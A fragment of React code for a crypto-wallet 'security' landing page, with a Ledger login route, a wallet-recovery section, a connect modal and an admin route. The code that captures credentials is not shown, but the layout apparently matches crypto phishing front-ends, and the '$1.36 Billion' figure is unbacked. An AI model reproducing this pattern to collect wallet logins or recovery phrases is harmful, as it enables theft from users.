      ...
      <div className="main-content">
          ...
          <div className="hero-container">
            ...
            <div className="hero-left">
              ...
              <p className="hero-subtitle" data-aos="fade-up" data-aos-delay="100">
                Protect your assets with next-level security built for real-world threats.
              </p>
 
              <p className="hero-subtitle italic-subtext" data-aos="fade-up" data-aos-delay="150">
                One mistake shouldn't cost you everything.
                <br />
                Our system helps keep your crypto safe from hackers, scams, and unauthorized
                access — without requiring technical skills.
              </p>
              ...
              <div className="hero-buttons" data-aos="fade-up" data-aos-delay="200">
                ...
                <button className="btn-secondary" onClick={() => navigate("/ledger-login")}>
                  Access Ledger
                </button>
              </div>
            </div>
            ...
            <div className="hero-right" data-aos="zoom-in">
              ...
              >
                <img src={web3Image} alt="Web3 visual" />
              </div>
            </div>
        ...
        <section id="stats" className="stats">
          ...
          <div className="stat" data-aos="fade-up" data-aos-delay="300">
            <Stat end={1.36} decimals={2} prefix="$" suffix=" Billion" />
            <p>Secured Volume</p>
          </div>
        </section>
        ...
        {/* SECTIONS */}
        <SecureSection />
        <HowToGetStarted onConnectClick={() => setOpenModal(true)} />
        <WalletRecoverySection onConnectClick={() => setOpenModal(true)} />
        <FAQ onConnectClick={() => setOpenModal(true)} />
        <TrustedBy />
        <Newsletter />
 
        {/* CONNECT MODAL */}
        <ConnectModal isOpen={openModal} onClose={() => setOpenModal(false)} />
...
function App() {
  ...
  return (
    <Routes>
      ...
      {/* ── Admin (protected — only your UID can access) ── */}
